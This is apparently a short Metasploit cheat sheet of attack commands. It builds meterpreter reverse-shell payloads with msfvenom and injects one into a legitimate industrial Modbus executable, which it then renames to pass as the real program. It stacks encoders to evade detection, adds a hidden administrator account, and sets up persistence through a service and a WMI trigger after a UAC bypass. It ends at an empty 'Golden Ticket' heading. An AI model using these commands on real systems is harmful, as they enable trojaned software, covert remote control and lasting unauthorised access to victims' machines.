### Execute a command
execute -if systeminfo

### Scan for Vulns/0days
msfpescan - windows
msfmachscan - Mac
msfelfscan - unix 

##Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -f exe -a x86 --platform windows -o installer.exe


### Payload inject into real file 
wget website/download.exe
msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 -o tmp.exe -k -x 'Smartline modbus.exe'
mv tmp.exe SmartLineModBus.exe 	


#### Double encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 138 -f exe -o new_payload.exe

## Persistance

### New User
execute -f "net user /add assetmgtacct assetpassword "
execute -f "net localgroup administrators /add assetmgtacct"
execute -i -f "net user"
### services
use exploit/windows/local/persistence_service
	set session 1
	set lport 4445
	set lhost 10.10.75.1
	exploit/
### WMI Event Subscription (trigger on fail login for non-existing user)
use exploit/windows/local/bypassuac_injection
	set session 1
	run


exploit/windows/local/wmi_persistence
	set session 2
	set lhost 10.10.75.1
	set username_trigger josh
	set callback_interval 1000
	exploit 

use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.75.1
### Golden Ticket